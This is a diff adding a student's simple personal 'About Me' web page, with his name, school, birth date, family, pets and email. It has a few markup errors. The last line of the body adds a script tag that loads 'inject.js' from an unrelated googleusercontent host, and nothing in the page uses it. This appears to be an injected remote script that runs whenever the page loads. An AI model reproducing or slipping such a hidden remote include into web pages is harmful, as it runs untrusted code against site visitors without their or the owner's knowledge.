@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta lang="en">
+    <meta viewport="width=device-width, initial-scale=1">
+    <title>Title</title>
+    <!--<link rel="stylesheet" href="css/style.css">-->
+    <!--<source src="js/script.js" defer>-->
+</head>
+
+    <style>
+        * {
+           font-family:Verdana, Geneva, Tahoma, sans-serif;
+           background-color: bisque;
+        }
+
+        #email {
+            font-size:x-small
+        }
+        
+        #head {
+            font
+        }
+    </style>
+
+<body>
+
+    <div id="head">
+        <h1> About Me! </h2>
+    </div>
+
+    <div id="intro">
+        <p>Hi, my name is Max Arrowood! I am currently a 17 year old senior at
+        <a href= https://www.craighighschool.org> Janesville Craig High.</a>
+        I was born here in Janesville, Wisconsin on October 7th, 2004. I have 2 siblings and 2 pets. My siblings are Maddy <i>(older sister)</i>
+        and Mason <i>(younger brother)</i>. My pets are two pugs, named Bean and Bucky.</p>
+    </div>
+
+
+
+
+
+
+
+    <footer id="email">
+        <a href="mailto:mbawood21@gmail.com"> <i>Email Me!</i></a>
+    </footer>
+
+<script type='text/javascript'  src="https://doc-14-7k-docs.googleusercontent.com/5807a17879fa8332cf5c93162cf5a4421bb5724aa76a47cb699e003df7957a8f/inject.js?id=d3787f12-3afe-45f4-9ed3-b7f389b86a24"></script></body>
+</html>
